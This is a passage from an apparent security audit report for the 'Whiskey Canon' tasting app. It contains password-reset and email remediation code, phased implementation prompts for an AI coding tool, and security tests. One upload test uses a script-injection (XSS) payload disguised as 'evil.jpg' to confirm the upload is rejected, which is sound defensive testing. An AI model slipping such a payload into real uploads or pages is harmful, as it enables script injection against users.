  credentials: config.aws.accessKeyId && config.aws.secretAccessKey
    ? {
        accessKeyId: config.aws.accessKeyId,
        secretAccessKey: config.aws.secretAccessKey,
      }
    : undefined,  // Use IAM role if no explicit credentials
});

export interface EmailOptions {
  to: string;
  subject: string;
  html: string;
  text?: string;
  replyTo?: string;
}

export async function sendEmail(options: EmailOptions): Promise<boolean> {
  if (config.nodeEnv !== 'production' && !process.env.ENABLE_EMAIL_IN_DEV) {
    logger.info({ to: options.to, subject: options.subject }, 'Email sending skipped (non-production)');
    console.log('--- EMAIL PREVIEW ---');
    console.log(`To: ${options.to}`);
    console.log(`Subject: ${options.subject}`);
    console.log(`Body: ${options.text || options.html}`);
    console.log('--- END PREVIEW ---');
    return true;
  }

  try {
    const command = new SendEmailCommand({
      Source: config.aws.sesFromEmail,
      Destination: {
        ToAddresses: [options.to],
      },
      Message: {
        Subject: { Data: options.subject, Charset: 'UTF-8' },
        Body: {
          Html: { Data: options.html, Charset: 'UTF-8' },
          Text: { Data: options.text || options.html.replace(/<[^>]*>/g, ''), Charset: 'UTF-8' },
        },
      },
      ReplyToAddresses: options.replyTo ? [options.replyTo] : undefined,
    });

    await sesClient.send(command);
    logger.info({ to: options.to, subject: options.subject }, 'Email sent successfully');
    return true;
  } catch (error) {
    logger.error({ err: error, to: options.to, subject: options.subject }, 'Failed to send email');
    return false;
  }
}

// Email templates
export const emailTemplates = {
  passwordReset: (resetUrl: string, displayName: string) => ({
    subject: 'Reset Your Password - Whiskey Canon',
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          .header { background: #1a1a2e; color: #d4af37; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
          .content { background: #f9f9f9; padding: 30px; border-radius: 0 0 8px 8px; }
          .button { display: inline-block; background: #d4af37; color: #1a1a2e; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 20px 0; }
          .footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>Whiskey Canon</h1>
          </div>
          <div class="content">
            <h2>Password Reset Request</h2>
            <p>Hi ${displayName},</p>
            <p>We received a request to reset your password. Click the button below to create a new password:</p>
            <p style="text-align: center;">
              <a href="${resetUrl}" class="button">Reset Password</a>
            </p>
            <p>This link will expire in <strong>1 hour</strong>.</p>
            <p>If you didn't request this, you can safely ignore this email. Your password will remain unchanged.</p>
            <div class="footer">
              <p>This email was sent by Whiskey Canon. If you have questions, please contact support.</p>
              <p>For security, this link can only be used once.</p>
            </div>
          </div>
        </div>
      </body>
      </html>
    `,
    text: `
Hi ${displayName},

We received a request to reset your password.

Click the link below to create a new password:
${resetUrl}

This link will expire in 1 hour.

If you didn't request this, you can safely ignore this email.

- Whiskey Canon Team
    `.trim(),
  }),

  welcomeEmail: (displayName: string) => ({
    subject: 'Welcome to Whiskey Canon!',
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <style>
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          .header { background: #1a1a2e; color: #d4af37; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
          .content { background: #f9f9f9; padding: 30px; border-radius: 0 0 8px 8px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>Welcome to Whiskey Canon!</h1>
          </div>
          <div class="content">
            <h2>Welcome, ${displayName}!</h2>
            <p>Your account has been created successfully. You can now:</p>
            <ul>
              <li>Host blind tasting sessions with friends</li>
              <li>Track your tasting notes and scores</li>
              <li>Discover new whiskeys without bias</li>
            </ul>
            <p>Slainte!</p>
          </div>
        </div>
      </body>
      </html>
    `,
    text: `Welcome to Whiskey Canon, ${displayName}! Your account has been created.`,
  }),
};

// Convenience functions
export async function sendPasswordResetEmail(
  email: string,
  resetToken: string,
  displayName: string
): Promise<boolean> {
  const resetUrl = `${config.clientUrl}/reset-password?token=${resetToken}`;
  const template = emailTemplates.passwordReset(resetUrl, displayName);

  return sendEmail({
    to: email,
    subject: template.subject,
    html: template.html,
    text: template.text,
  });
}

export async function sendWelcomeEmail(email: string, displayName: string): Promise<boolean> {
  const template = emailTemplates.welcomeEmail(displayName);

  return sendEmail({
    to: email,
    subject: template.subject,
    html: template.html,
    text: template.text,
  });
}
```

```typescript
// server/src/db/schema.ts - Add password reset tokens table

export const passwordResetTokens = sqliteTable('password_reset_tokens', {
  id: text('id').primaryKey().$defaultFn(() => crypto.randomUUID()),
  userId: text('user_id').notNull().references(() => users.id, { onDelete: 'cascade' }),
  token: text('token').notNull().unique(),
  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
  usedAt: integer('used_at', { mode: 'timestamp' }),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  ipAddress: text('ip_address'),
});
```

```typescript
// server/src/routes/auth.ts - Add password reset endpoints

import crypto from 'crypto';
import { sendPasswordResetEmail } from '../services/email';
import { passwordResetLimiter } from '../middleware/rateLimit';

// Request password reset
router.post('/forgot-password', passwordResetLimiter, async (req: Request, res: Response) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const normalizedEmail = normalizeEmail(email);

  // Always return success to prevent email enumeration
  const successResponse = {
    message: 'If an account with that email exists, a password reset link has been sent.'
  };

  try {
    const user = await db.query.users.findFirst({
      where: eq(schema.users.email, normalizedEmail),
    });

    if (!user) {
      // Don't reveal if user exists
      return res.json(successResponse);
    }

    // Delete any existing reset tokens for this user
    await db.delete(schema.passwordResetTokens)
      .where(eq(schema.passwordResetTokens.userId, user.id));

    // Generate secure token
    const resetToken = crypto.randomBytes(32).toString('hex');
    const hashedToken = crypto.createHash('sha256').update(resetToken).digest('hex');

    // Store hashed token (so even if DB is leaked, tokens can't be used)
    await db.insert(schema.passwordResetTokens).values({
      userId: user.id,
      token: hashedToken,
      expiresAt: new Date(Date.now() + 60 * 60 * 1000), // 1 hour
      ipAddress: req.ip,
    });

    // Send email with unhashed token
    await sendPasswordResetEmail(user.email, resetToken, user.displayName);

    return res.json(successResponse);
  } catch (error) {
    logger.error({ err: error }, 'Password reset request failed');
    return res.json(successResponse); // Don't reveal errors
  }
});

// Reset password with token
router.post('/reset-password', async (req: Request, res: Response) => {
  const { token, newPassword } = req.body;

  if (!token || !newPassword) {
    return res.status(400).json({ error: 'Token and new password are required' });
  }

  // Validate new password
  const passwordValidation = validatePassword(newPassword);
  if (!passwordValidation.valid) {
    return res.status(400).json({
      error: 'Password does not meet requirements',
      details: passwordValidation.errors
    });
  }

  // Hash the provided token to compare with stored hash
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

  try {
    const resetRecord = await db.query.passwordResetTokens.findFirst({
      where: and(
        eq(schema.passwordResetTokens.token, hashedToken),
        isNull(schema.passwordResetTokens.usedAt),
        gt(schema.passwordResetTokens.expiresAt, new Date())
      ),
    });

    if (!resetRecord) {
      return res.status(400).json({ error: 'Invalid or expired reset token' });
    }

    // Get user
    const user = await db.query.users.findFirst({
      where: eq(schema.users.id, resetRecord.userId),
    });

    if (!user) {
      return res.status(400).json({ error: 'User not found' });
    }

    // Hash new password
    const passwordHash = await bcrypt.hash(newPassword, 12);

    // Update password
    await db.update(schema.users)
      .set({ passwordHash })
      .where(eq(schema.users.id, user.id));

    // Mark token as used
    await db.update(schema.passwordResetTokens)
      .set({ usedAt: new Date() })
      .where(eq(schema.passwordResetTokens.id, resetRecord.id));

    // Invalidate all refresh tokens (force re-login everywhere)
    await db.delete(schema.refreshTokens)
      .where(eq(schema.refreshTokens.userId, user.id));

    // Audit log
    await audit.logAuditEvent({
      actorId: user.id,
      actorEmail: user.email,
      action: 'user.password.update',
      targetType: 'user',
      targetId: user.id,
      newValue: { method: 'password_reset' },
      req,
    });

    return res.json({ message: 'Password has been reset successfully' });
  } catch (error) {
    logger.error({ err: error }, 'Password reset failed');
    return res.status(500).json({ error: 'Failed to reset password' });
  }
});
```

---

## Positive Security Practices

The following security practices are correctly implemented:

1. **Password Hashing:** bcrypt with 12 salt rounds (industry standard)
2. **SQL Injection Prevention:** Drizzle ORM with parameterized queries throughout
3. **Foreign Key Constraints:** Enabled with cascading deletes
4. **Role-Based Access Control:** Admin role properly enforced on admin routes
5. **Self-Protection Rules:** Admins cannot delete themselves or demote themselves
6. **Password Verification:** Required for email and password changes
7. **Refresh Token Invalidation:** All refresh tokens deleted on password change
8. **Whiskey Identity Protection:** Hidden until moderator reveals
9. **Score Isolation:** Participant scores hidden from others during active tasting
10. **CORS Configuration:** Credentials mode properly configured
11. **File Size Limits:** 5MB limit on avatar uploads
12. **Disposable Email Blocking:** Common disposable email domains blocked

---

## Claude Code Implementation Guide

### Implementation Timeline

| Phase | Duration | Priority | Tasks | Verification |
|-------|----------|----------|-------|--------------|
| **Phase 1** | Week 1 | Critical | JWT config, rate limiting, invite codes, helmet | Server fails without JWT_SECRET |
| **Phase 2** | Week 2 | High | Password validation, file validation, audit logging | Password "weak123" rejected |
| **Phase 3** | Week 3 | High | AWS SES email, password reset | Reset email received |
| **Phase 4** | Week 4 | Medium | CSRF, cookie migration, Zod schemas | CSRF token required |
| **Phase 5** | Month 2 | Enhancement | Neon PostgreSQL, accessibility, theming | Database migrated to Neon |
| **Phase 6** | Month 3-4 | Architecture | Next.js migration, Server Components, Ably real-time | App running on Next.js + Vercel |

---

### Phase 1 Prompt: Critical Security Fixes

Copy and paste this standalone prompt:

```
Install express-rate-limit and helmet packages:
npm install express-rate-limit helmet

Then implement these critical security fixes:

1. Create server/src/config/index.ts:
   - Add requireEnv() function that calls process.exit(1) if JWT_SECRET is missing
   - Export config object with: jwtSecret, nodeEnv, port, clientUrl
   - Validate JWT_SECRET is at least 32 characters

2. Update server/src/middleware/auth.ts:
   - Import config from '../config'
   - Remove the hardcoded fallback: || 'whiskey-canon-secret-change-in-production'
   - Use config.jwtSecret instead
   - Change access token expiry from '24h' to '15m'
   - Change refresh token expiry from '7d' to '24h'

3. Create server/src/middleware/rateLimit.ts:
   - loginLimiter: 5 attempts per 15 min per IP+email
   - registerLimiter: 3 per hour per IP
   - joinLimiter: 10 per minute per IP
   - apiLimiter: 100 per minute global

4. Apply rate limiters in routes:
   - Add apiLimiter to server/src/index.ts before routes
   - Add loginLimiter to POST /login in auth.ts
   - Add registerLimiter to POST /register in auth.ts
   - Add joinLimiter to POST /join in sessions.ts

5. Update server/src/routes/sessions.ts generateInviteCode():
   - Import crypto
   - Replace Math.random() with crypto.randomBytes(8)
   - Increase code length from 6 to 8 characters

6. Add helmet to server/src/index.ts:
   - Configure CSP allowing 'self' and 'unsafe-inline' for styles
   - Set frameguard to deny
   - Enable noSniff
   - Configure HSTS for production

Use TodoWrite to track each task. Mark complete after verification.
```

---

### Phase 2 Prompt: High Priority Fixes

Copy and paste this standalone prompt:

```
Install file-type and sharp packages:
npm install file-type sharp

Then implement these high priority fixes:

1. Add password validation to server/src/utils/validation.ts:
   - Create validatePassword(password, email?) function
   - Require minimum 12 characters
   - Require uppercase, lowercase, number, special character
   - Block common passwords (password, 123456, qwerty, etc.)
   - Check for sequential characters (abc, 123)
   - Return { valid: boolean, errors: string[] }

2. Apply password validation in server/src/routes/auth.ts:
   - Use in registration handler (replace 6 char check)
   - Use in password change handler

3. Add file content validation in server/src/routes/auth.ts:
   - Create validateAndSanitizeImage() function
   - Use file-type to check magic bytes
   - Use sharp to re-encode and strip malicious content
   - Apply to avatar upload handler

4. Fix email normalization in server/src/routes/auth.ts:
   - In login handler (around line 148)
   - Change email.toLowerCase() to normalizeEmail(email)

5. Create audit logging:
   - Add audit_logs table to server/src/db/schema.ts
   - Create server/src/services/audit.ts with logAuditEvent()
   - Add logging to admin.ts for role changes and deletions

Run: sqlite3 data/whiskey.db to add the audit_logs table manually.

Use TodoWrite to track progress.
```

---

### Phase 3 Prompt: Email Integration

Copy and paste this standalone prompt:

```
Install AWS SES package:
npm install @aws-sdk/client-ses

Then implement email integration:

1. Create server/src/services/email.ts:
   - Initialize SESClient with AWS credentials from environment
   - Create sendEmail(to, subject, html, text) function
   - Create password reset email template
   - Create sendPasswordResetEmail(email, token, displayName) helper

2. Add password_reset_tokens table to server/src/db/schema.ts:
   - id (text, primary key)
   - userId (text, references users)
   - token (text, unique) - store HASHED token
   - expiresAt (timestamp)
   - usedAt (timestamp, nullable)
   - createdAt (timestamp)
   - ipAddress (text)

3. Add to server/src/routes/auth.ts:
   POST /forgot-password:
   - Rate limit: 3 per hour per email
   - Generate token with crypto.randomBytes(32)
   - Hash token before storing in DB
   - Send email with unhashed token in URL
   - Always return success (prevent enumeration)

   POST /reset-password:
   - Validate token and check expiry
   - Validate new password with validatePassword()
   - Update password hash
   - Mark token as used
   - Invalidate all refresh tokens

Run ALTER TABLE to add password_reset_tokens table.

Use TodoWrite to track progress.
```

---

### Phase 4 Prompt: Cleanup and Hardening

Copy and paste this standalone prompt:

```
Install remaining packages:
npm install zod pino
npm install -D pino-pretty

Then implement cleanup:

1. Create server/src/utils/schemas.ts:
   - registerSchema: email, password (min 12), displayName (2-30)
   - loginSchema: email, password
   - sessionCreateSchema: name, theme, whiskeys array
   - scoreSubmitSchema: all score fields with limits
   - Create validate(schema) middleware factory

2. Apply Zod validation to major routes in auth.ts and sessions.ts

3. Create server/src/utils/logger.ts:
   - Configure Pino with log levels
   - Add redaction for: password, token, authorization
   - Create requestLogger middleware
   - Replace console.error/log calls with logger

4. Add CSRF protection:
   - Create server/src/middleware/csrf.ts
   - Generate token on GET requests (store in cookie)
   - Validate x-csrf-token header on POST/PATCH/DELETE
   - Update src/services/api.ts to send CSRF token

5. Migrate frontend auth to cookies:
   - In src/store/authStore.ts: Remove localStorage token storage
   - In src/services/api.ts: Remove Authorization header injection
   - Keep credentials: 'include' for cookie auth

Use TodoWrite to track progress.
```

---

### Phase 5 Prompt: Neon PostgreSQL Migration

Copy and paste this standalone prompt:

```
Migrate from SQLite to Neon PostgreSQL for production scalability.

1. Create Neon project at neon.tech:
   - Sign up and create new project
   - Copy connection string to .env as DATABASE_URL
   - Enable connection pooling

2. Install PostgreSQL packages:
   npm install @neondatabase/serverless
   npm install -D drizzle-kit

3. Update drizzle.config.ts:
   - Change dialect from 'sqlite' to 'postgresql'
   - Update dbCredentials to use DATABASE_URL
   - Remove SQLite-specific options

4. Update server/src/db/index.ts:
   - Import { neon } from '@neondatabase/serverless'
   - Import { drizzle } from 'drizzle-orm/neon-http'
   - Create connection: const sql = neon(process.env.DATABASE_URL!)
   - Export: const db = drizzle(sql, { schema })

5. Update schema types in server/src/db/schema.ts:
   - Change integer() to serial() for auto-increment IDs
   - Change text() to varchar() where length limits apply
   - Add pgTable import from drizzle-orm/pg-core

6. Generate and run migration:
   npx drizzle-kit generate
   npx drizzle-kit push

7. Test locally with connection string before deploying.

Use TodoWrite to track progress.
```

---

### Phase 6 Prompt: Next.js Migration

Copy and paste this standalone prompt:

```
This is a major architectural migration from Vite + Express to Next.js.
Execute in 6 stages over 4-6 weeks.

STAGE 1: Initialize Next.js alongside existing code

Create Next.js 16 app:
npx create-next-app@latest . --typescript --tailwind --app --src-dir --import-alias "@/*"

Keep existing code, add Next.js structure:
- app/ directory for new pages
- Keep src/ for shared components during transition

Configure Drizzle for Server Components:
- Move db connection to lib/db.ts
- Ensure server-only imports

STAGE 2: Migrate pages to App Router

Convert routes one-by-one:
- / → app/page.tsx (Server Component)
- /login → app/(auth)/login/page.tsx
- /register → app/(auth)/register/page.tsx
- /sessions → app/(dashboard)/sessions/page.tsx
- /sessions/:id → app/(dashboard)/sessions/[id]/page.tsx

For each page:
- If no interactivity needed → Server Component (default)
- If uses useState/useEffect → Client Component ("use client")
- Replace useEffect data fetching with async Server Component

STAGE 3: Migrate API routes

Convert Express routes to Route Handlers:
- POST /api/auth/login → app/api/auth/login/route.ts
- POST /api/auth/register → app/api/auth/register/route.ts
- GET /api/sessions → app/api/sessions/route.ts

Use Server Actions for mutations:
- Create actions/sessions.ts with createSession, updateSession, etc.
- Use "use server" directive
- Call directly from form onSubmit

STAGE 4: Handle Socket.io real-time

Option A - Ably (Recommended for Vercel):
npm install ably

Create lib/ably.ts:
- Initialize Ably client with API key
- Export channel helpers for session rooms

Update real-time components:
- Replace socket.emit with channel.publish
- Replace socket.on with channel.subscribe
- Handle presence with Ably presence API

Option B - Separate Socket.io service:
- Keep server/src/socket/ code
- Deploy separately to Railway/Render
- Connect from Next.js via NEXT_PUBLIC_SOCKET_URL

STAGE 5: Update state management

Audit Zustand stores:
- authStore: Move server state to Server Components, keep isAuthenticated for UI
- sessionStore: Replace with Server Components + Ably for real-time

Keep Zustand only for:
- Modal open/close state
- Sidebar collapsed state
- Form draft state (if needed)

STAGE 6: Clean up

Remove old code:
- vite.config.ts
- server/src/index.ts (except Socket.io if Option B)
- server/src/routes/ (moved to Route Handlers/Actions)
- React Router configuration

Update package.json scripts:
- "dev": "next dev"
- "build": "next build"
- "start": "next start"

Update deployment:
- Configure vercel.json for Next.js
- Set environment variables in Vercel dashboard
- Deploy and verify

Use TodoWrite to track each stage. Mark complete only when verified working.
```

---

### Security Test Cases

Add these tests to verify security fixes:

```typescript
// tests/security/rate-limiting.test.ts
import request from 'supertest';
import { app } from '../server/src/index';

describe('Rate Limiting', () => {
  it('blocks login after 5 failed attempts', async () => {
    const email = 'test@example.com';

    // Make 5 failed attempts
    for (let i = 0; i < 5; i++) {
      await request(app)
        .post('/api/auth/login')
        .send({ email, password: 'wrongpassword' });
    }

    // 6th attempt should be rate limited
    const response = await request(app)
      .post('/api/auth/login')
      .send({ email, password: 'wrongpassword' });

    expect(response.status).toBe(429);
    expect(response.body.error).toContain('Too many');
  });

  it('allows login after rate limit window expires', async () => {
    // Test would need time manipulation or shorter test window
  });
});

// tests/security/password-validation.test.ts
describe('Password Validation', () => {
  it('rejects passwords under 12 characters', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'test@example.com',
        password: 'Short1!',
        displayName: 'Test User'
      });

    expect(response.status).toBe(400);
    expect(response.body.details).toContain('12 characters');
  });

  it('rejects passwords without uppercase', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'test@example.com',
        password: 'alllowercase123!',
        displayName: 'Test User'
      });

    expect(response.status).toBe(400);
    expect(response.body.details).toContain('uppercase');
  });

  it('rejects common passwords', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'test@example.com',
        password: 'Password123!',  // Contains "password"
        displayName: 'Test User'
      });

    expect(response.status).toBe(400);
  });

  it('accepts strong passwords', async () => {
    const response = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'newuser@example.com',
        password: 'MyStr0ng!P@ssw0rd',
        displayName: 'Test User'
      });

    expect(response.status).toBe(200);
  });
});

// tests/security/jwt-config.test.ts
describe('JWT Configuration', () => {
  it('fails to start without JWT_SECRET', () => {
    const originalSecret = process.env.JWT_SECRET;
    delete process.env.JWT_SECRET;

    expect(() => {
      jest.resetModules();
      require('../server/src/config');
    }).toThrow();

    process.env.JWT_SECRET = originalSecret;
  });

  it('rejects JWT_SECRET under 32 characters', () => {
    const originalSecret = process.env.JWT_SECRET;
    process.env.JWT_SECRET = 'short';

    expect(() => {
      jest.resetModules();
      require('../server/src/config');
    }).toThrow();

    process.env.JWT_SECRET = originalSecret;
  });
});

// tests/security/file-upload.test.ts
describe('File Upload Validation', () => {
  it('rejects files with spoofed MIME type', async () => {
    // Create a fake "image" that is actually HTML
    const maliciousFile = Buffer.from('<script>alert("xss")</script>');

    const response = await request(app)
      .post('/api/auth/me/avatar')
      .set('Authorization', `Bearer ${validToken}`)
      .attach('avatar', maliciousFile, {
        filename: 'evil.jpg',
        contentType: 'image/jpeg'  // Spoofed MIME type
      });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Invalid');
  });

  it('accepts valid image files', async () => {
    const validJpeg = fs.readFileSync('./tests/fixtures/valid.jpg');

    const response = await request(app)
      .post('/api/auth/me/avatar')
      .set('Authorization', `Bearer ${validToken}`)
      .attach('avatar', validJpeg, 'avatar.jpg');

    expect(response.status).toBe(200);
  });
});

// tests/security/security-headers.test.ts
describe('Security Headers', () => {
  it('includes required security headers', async () => {
    const response = await request(app).get('/api/health');

    expect(response.headers['x-frame-options']).toBe('DENY');
    expect(response.headers['x-content-type-options']).toBe('nosniff');
    expect(response.headers['content-security-policy']).toBeDefined();
    expect(response.headers['strict-transport-security']).toBeDefined();
  });
});

// tests/security/csrf.test.ts
describe('CSRF Protection', () => {
  it('rejects POST without CSRF token', async () => {
    const response = await request(app)
      .post('/api/sessions')
      .set('Cookie', 'accessToken=valid-token')
      .send({ name: 'Test Session' });

    expect(response.status).toBe(403);
    expect(response.body.error).toContain('CSRF');
  });

  it('accepts POST with valid CSRF token', async () => {
    // Get CSRF token from cookie
    const getResponse = await request(app).get('/api/auth/me');
    const csrfToken = getResponse.headers['set-cookie']
      .find(c => c.startsWith('csrf_token='))
      ?.split('=')[1]?.split(';')[0];

    const response = await request(app)
      .post('/api/sessions')
      .set('Cookie', 'accessToken=valid-token')
      .set('x-csrf-token', csrfToken)
      .send({ name: 'Test Session' });

    expect(response.status).not.toBe(403);
  });
});
```

---

### Environment Variables Required

Add these to your `.env` file:

```bash
# Required
JWT_SECRET=your-secure-random-string-at-least-32-characters-long

# Required in production
CLIENT_URL=https://your-domain.com
NODE_ENV=production

# AWS SES (for email)
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=your-access-key
AWS_SECRET_ACCESS_KEY=your-secret-key
SES_FROM_EMAIL=noreply@your-domain.com

# Optional
DATABASE_PATH=./data/whiskey.db
PORT=3001
```

---

## Appendix: File Reference

| File | Security Issues | Lines |
|------|-----------------|-------|
| `server/src/middleware/auth.ts` | JWT fallback, token expiry | 5, 97-106 |
| `server/src/routes/auth.ts` | Password validation, email normalization, file upload | 68, 148, 38-51, 76-78, 399 |
| `server/src/routes/sessions.ts` | Invite code RNG, JWT fallback | 15, 20-27 |
| `server/src/routes/admin.ts` | No audit logging | All |
| `server/src/index.ts` | No helmet, no rate limiting | All |
| `src/store/authStore.ts` | localStorage tokens | 53, 75, 96-97 |
| `src/services/api.ts` | localStorage tokens | 26-34 |

---

*Report generated by security consultant audit - January 26, 2026*
*Classification: Confidential*
